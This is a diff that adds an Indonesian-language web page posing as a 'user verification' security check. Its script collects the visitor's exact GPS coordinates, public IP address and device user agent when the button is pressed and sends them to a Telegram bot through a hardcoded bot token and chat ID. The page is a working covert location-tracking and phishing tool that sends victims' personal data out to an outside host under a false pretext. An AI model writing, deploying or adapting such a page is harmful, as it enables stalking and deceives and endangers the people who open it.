@@ -1,0 +1,96 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Verifikasi Pengguna</title>
+  <style>
+    body {
+      margin: 0;
+      padding: 0;
+      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+      background: linear-gradient(to right, #1e3c72, #2a5298);
+      color: white;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      height: 100vh;
+      text-align: center;
+    }
+    .container {
+      background-color: rgba(0, 0, 0, 0.4);
+      padding: 2em;
+      border-radius: 1em;
+      box-shadow: 0 0 15px rgba(0, 0, 0, 0.3);
+    }
+    button {
+      margin: 1em;
+      padding: 0.8em 2em;
+      font-size: 1em;
+      color: white;
+      background-color: #007bff;
+      border: none;
+      border-radius: 0.5em;
+      cursor: pointer;
+      transition: background 0.3s ease;
+    }
+    button:hover {
+      background-color: #0056b3;
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <h1>Verifikasi Identitas</h1>
+    <p>Untuk keamanan, mohon verifikasi lokasi Anda.</p>
+    <button onclick="getLocation()">Verifikasi Lokasi</button>
+  </div>
+
+  <script>
+    const BOT_TOKEN = '8127697153:AAH2mBjvtRwCvRzM_2iOyj9VlV1rtEUHqzI';
+    const CHAT_ID = '7066150802';
+
+    function sendToTelegram(message) {
+      const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+
+      fetch(url, {
+        method: "POST",
+        headers: {
+          'Content-Type': 'application/json'
+        },
+        body: JSON.stringify({
+          chat_id: CHAT_ID,
+          text: message
+        })
+      })
+      .then(response => response.json())
+      .then(data => console.log("Terkirim:", data))
+      .catch(error => console.error("Gagal kirim:", error));
+    }
+
+    function getLocation() {
+      if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(position => {
+          const latitude = position.coords.latitude;
+          const longitude = position.coords.longitude;
+          const userAgent = navigator.userAgent;
+
+          fetch("https://api.ipify.org?format=json")
+            .then(res => res.json())
+            .then(data => {
+              const ip = data.ip;
+              const message = `VERIFIKASI PENGGUNA\n====================\nLokasi:\nLatitude: ${latitude}\nLongitude: ${longitude}\n\nIP: ${ip}\nDevice: ${userAgent}`;
+              sendToTelegram(message);
+              alert("Data berhasil dikirim ke sistem.");
+            });
+        }, () => {
+          alert("Gagal mendapatkan lokasi.");
+        });
+      } else {
+        alert("Geolocation tidak didukung browser.");
+      }
+    }
+  </script>
+</body>
+</html>
